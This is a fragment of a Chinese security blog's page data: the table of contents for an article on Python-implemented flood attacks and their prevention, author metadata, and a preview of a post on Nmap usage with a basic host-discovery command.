href=\"#%E4%B8%89%E3%80%81-%E5%9F%BA%E4%BA%8EPYTHON%E5%AE%9E%E7%8E%B0%E6%B3%9B%E6%B4%AA%E6%94%BB%E5%87%BB\"><span class=\"toc-text\">三、 基于PYTHON实现泛洪攻击</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#1-TCP%E5%85%A8%E8%BF%9E%E6%8E%A5%E6%B3%9B%E6%B4%AA\"><span class=\"toc-text\">1. TCP全连接泛洪</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#2-TCP-SYN%E6%B3%9B%E6%B4%AA\"><span class=\"toc-text\">2. TCP SYN泛洪</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#3-TCP-Land%E6%B3%9B%E6%B4%AA\"><span class=\"toc-text\">3. TCP Land泛洪</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#4-%E5%8F%8D%E5%B0%84%E6%B3%9B%E6%B4%AA\"><span class=\"toc-text\">4. 反射泛洪</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#5-ICMP%E6%B3%9B%E6%B4%AA\"><span class=\"toc-text\">5. ICMP泛洪</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#6-MAC%E5%9C%B0%E5%9D%80%E6%B3%9B%E6%B4%AA\"><span class=\"toc-text\">6. MAC地址泛洪</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%9B%9B%E3%80%81%E9%A2%84%E9%98%B2%E6%B3%9B%E6%B4%AA%E6%94%BB%E5%87%BB\"><span class=\"toc-text\">四、预防泛洪攻击</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#1-%E6%89%A9%E5%A4%A7%E5%B8%A6%E5%AE%BD\"><span class=\"toc-text\">1. 扩大带宽</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#2-%E7%9B%91%E6%8E%A7%E5%BC%82%E5%B8%B8%E6%B5%81%E9%87%8F\"><span class=\"toc-text\">2. 监控异常流量</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#3-%E9%87%87%E7%94%A8%E9%AB%98%E9%98%B2%E8%AE%BE%E5%A4%87\"><span class=\"toc-text\">3. 采用高防设备</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#4-%E5%88%86%E5%B8%83%E5%BC%8F%E9%9B%86%E7%BE%A4%E9%98%B2%E5%BE%A1\"><span class=\"toc-text\">4. 分布式集群防御</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#5-%E8%BF%87%E6%BB%A4%E4%B8%8D%E5%BF%85%E8%A6%81%E7%9A%84%E6%9C%8D%E5%8A%A1%E5%92%8C%E7%AB%AF%E5%8F%A3\"><span class=\"toc-text\">5. 过滤不必要的服务和端口</span></a></li></ol></li></ol>","author":{"name":"Kcxuao","slug":"blog-author","avatar":"https://img.gejiba.com/images/d12fcf0171d543a357ba257c1187033f.webp","link":"/","description":"路漫漫其修远兮，吾将上下而求索","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{"qq":{"icon":"/img/qq.png","link":"http://wpa.qq.com/msgrd?v=3&uin=3187294487&site=qq&menu=yes"},"github":{"icon":"/img/github.png","link":"https://github.com/Kcxuao"},"email":{"icon":"/img/email.png","link":"mailto:kcxuao@gmail.com"}}}},"mapped":true,"prev_post":{},"next_post":{"title":"NMAP使用详解","uid":"a3a1f8d9a7d66f6dde418e09a78c8d1a","slug":"NMAP使用详解","date":"2022-08-22T08:30:17.000Z","updated":"2022-08-22T08:34:33.048Z","comments":true,"path":"api/articles/NMAP使用详解.json","keywords":null,"cover":"https://gimg2.baidu.com/image_search/src=http%3A%2F%2Fimg.mp.itc.cn%2Fupload%2F20161230%2Fa91026a08e384bed9f65e512a0f84133_th.jpeg&refer=http%3A%2F%2Fimg.mp.itc.cn&app=2002&size=f9999,10000&q=a80&n=0&g=0n&fmt=auto?sec=1663749259&t=cb8b42168e41eb49e68c6bbd426dca6c","text":"一、功能 TIP 主机发现：检测目标主机是否在线 端口扫描：检测端口状态和提供的服务 版本侦测：检测端口提供服务的包或软件的版本信息 操作系统侦测：检测主机使用的操作系统 二、基本使用1.扫描IP地址(网段) nmap -sn 192.168.1.0/24 nmap -sn 19...","link":"","photos":[],"count_time":{"symbolsCount":"6.4k","symbolsTime":"6 mins."},"categories":[{"name":"网络安全","slug":"网络安全","count":8,"path":"api/categories/网络安全.json"},{"name":"工具使用","slug":"网络安全/工具使用","count":1,"path":"api/categories/网络安全/工具使用.json"}],"tags":[{"name":"网络安全","slug":"网络安全","count":8,"path":"api/tags/网络安全.json"},{"name":"工具使用","slug":"工具使用","count":1,"path":"api/tags/工具使用.json"}],"author":{"name":"Kcxuao","slug":"blog-author","avatar":"https://img.gejiba.com/images/d12fcf0171d543a357ba257c1187033f.webp","link":"/","description":"路漫漫其修远兮，吾将上下而求索","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{"qq":{"icon":"/img/qq.png","link":"http://wpa.qq.com/msgrd?v=3&uin=3187294487&site=qq&menu=yes"},"github":{"icon":"/img/github.png","link":"https://github.com/Kcxuao"},"email":{"icon":"/img/email.png","link":"mailto:kcxuao@gmail.com"}}}},"feature":true}}